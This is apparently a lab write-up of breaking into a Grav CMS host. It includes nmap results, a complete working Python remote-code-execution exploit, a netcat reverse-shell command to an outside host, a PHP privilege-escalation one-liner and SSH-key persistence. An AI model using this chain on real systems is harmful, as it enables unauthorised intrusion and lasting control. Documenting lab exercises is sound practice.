@@ -1,0 +1,115 @@
+Beginning with a typical service and version scan with nmap, we find that only ports 22 (ssh) and 80 (http) are open. Additionally we are informed that there is a directory listing available, notably grav-admin.
+
+##### Nmap Results
+
+```nmap-output
+
+$ nmap 192.168.228.12 -sC -sV
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 17:05 EDT
+Nmap scan report for 192.168.228.12
+Host is up (0.041s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
+|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
+|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
+
+80/tcp open  http    Apache httpd 2.4.41
+|_http-title: Index of /
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+|-     2021-03-17 17:46  grav-admin/
+|_
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
+```
+
+Enumerating the website, we in fact find that there is a content management system in use, Grav-CMS
+
+![[Pasted image 20240823171949.png]]
+
+##### Exploit
+
+```python
+
+#!/usr/bin/python
+
+import requests
+from bs4 import BeautifulSoup
+from time import sleep
+import urllib.parse
+import argparse
+
+parser = argparse.ArgumentParser(description='Grav Admin 1.7.10 RCE')
+parser.add_argument('-c', help='Command', required=True)
+parser.add_argument('-t', help='URL (Eg: http://grav.local)', required=True)
+args = parser.parse_args()
+
+url = args.t
+cmd = args.c
+cmd = urllib.parse.quote(cmd)
+
+session = requests.Session()
+
+# Getting Nonce
+r = session.get(url+'/admin')
+soup = BeautifulSoup(r.text, features="lxml")
+a = str(soup.findAll('input')[3])
+nonce = a[47:79]
+
+# Creating File
+print("[*] Creating File")
+payload = f'admin-nonce={nonce}&task=SaveDefault&data[custom_jobs][vwlya][command]=/usr/bin/echo&data[custom_jobs][vwlya][args]={cmd}&data[custom_jobs][vwlya][at]=%2a%20%2a%20%2a%20%2a%20%2a&data[custom_jobs][vwlya][output]=/tmp/shell.sh&data[status][vwlya]=enabled&data[custom_jobs][vwlya][output_mode]=overwrite'
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+r = session.post(url+'/admin/config/scheduler',data=payload,headers=headers)
+
+if "Invalid Security Token" in r.text:
+	exit("Exploit failed :(")
+else:
+	print("Scheduled task created for file creation, wait one minute")
+	sleep(60)
+
+# Running File
+print("[*] Running file")
+payload = f'admin-nonce={nonce}&task=SaveDefault&data[custom_jobs][vwlya][command]=/bin/bash&data[custom_jobs][vwlya][args]=/tmp/shell.sh&data[custom_jobs][vwlya][at]=%2a%20%2a%20%2a%20%2a%20%2a&data[custom_jobs][vwlya][output]=&data[status][vwlya]=enabled&data[custom_jobs][vwlya][output_mode]=overwrite'
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+r = session.post(url+'/admin/config/scheduler',data=payload,headers=headers)
+
+if "Invalid Security Token" in r.text:
+	exit("Exploit failed :(")
+else:
+	print("Scheduled task created for command, wait one minute")
+	sleep(60)
+
+print("Exploit completed")
+```
+
+##### Command Line
+
+```
+python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.153 80 >/tmp/f' -t http://192.168.207.12/grav-admin
+```
+
+##### Stabilize Shell
+
+```
+export TERM=xterm;python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+##### Escalate Privileges
+
+```shell
+/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
+```
+
+##### Persistence via SSH
+
+```
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILAZx4H33cGVBsKenyVMB5vEuE2CVK/0/xPnhxWfBWGj" >> authorized_keys
+```
